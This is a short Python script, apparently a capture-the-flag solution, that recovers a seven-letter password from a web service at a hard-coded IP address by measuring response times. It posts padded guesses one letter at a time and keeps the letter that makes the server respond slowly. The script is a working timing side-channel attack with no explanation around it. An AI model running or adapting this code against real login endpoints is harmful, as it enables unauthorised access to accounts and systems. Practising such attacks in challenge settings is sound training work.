import requests
import string

url = "http://34.31.154.223:55265/"
charset = string.ascii_letters
flag = ""

for i in range(7):
    for j in charset:
        pwd = (flag + j).ljust(7, '.')
        password = {
            "password": pwd
        }
        print(password)
        req = requests.post(url, data=password)
        if int(req.elapsed.total_seconds()) > len(flag):
            flag += j
            break

